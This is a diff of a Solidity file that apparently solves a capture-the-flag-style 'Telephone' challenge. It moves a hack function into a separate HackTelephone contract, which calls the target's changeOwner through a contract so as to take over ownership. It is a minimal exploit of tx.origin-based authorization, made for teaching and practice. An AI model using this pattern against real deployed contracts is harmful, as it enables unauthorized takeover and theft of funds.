@@ -2,12 +2,10 @@
 pragma solidity ^0.6.0;
 
 contract Telephone {
-    Telephone telephone; //SOL
     address public owner;
 
-    constructor(Telephone _telephone) public {
+    constructor() public {
         owner = msg.sender;
-        telephone = _telephone; //SOL
     }
 
     function changeOwner(address _owner) public {
@@ -15,9 +13,11 @@ contract Telephone {
             owner = _owner;
         }
     }
+}
 
-    // SOL
-    function hackTelephone() public {
-        telephone.changeOwner(msg.sender);
+//Sol
+contract HackTelephone {
+    function changeOwner(Telephone _telephone, address _owner) public {
+        _telephone.changeOwner(_owner);
     }
 }
